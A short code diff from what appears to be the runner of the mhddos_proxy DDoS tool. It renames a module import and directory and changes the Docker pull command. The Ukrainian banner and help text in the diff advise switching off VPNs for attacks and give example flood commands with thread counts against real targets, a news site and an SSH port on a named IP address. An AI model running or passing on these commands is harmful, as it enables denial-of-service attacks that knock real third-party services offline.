@@ -8,7 +8,7 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 from multiprocessing import cpu_count
 
 import requests
-from MHDDoS.start import logger, Methods
+from mhddos.start import logger, Methods
 from PyRoxy import Proxy
 
 
@@ -144,7 +144,7 @@ def run_ddos(targets, total_threads, period, rpc, http_methods, debug):
 
 
 def start(total_threads, period, targets, rpc, http_methods, debug):
-    os.chdir('MHDDoS')
+    os.chdir('mhddos')
     while True:
         resolved = list(targets)
         if not resolved:
@@ -217,7 +217,7 @@ def print_banner():
                             !!!ВИМКНІТЬ VPN!!!  (окрім UDP атак)
 
 # Конфігурація. Усі параметри можна комбінувати, можна вказувати і до і після переліку цілей.
-Для Docker замініть `python3 runner.py` на `docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest`
+Для Docker замініть `python3 runner.py` на `docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy`
 
 - Навантаження - `-t XXXX` - кількість потоків, за замовчуванням - CPU * 1000
     python3 runner.py -t 3000 https://ria.ru tcp://194.54.14.131:22
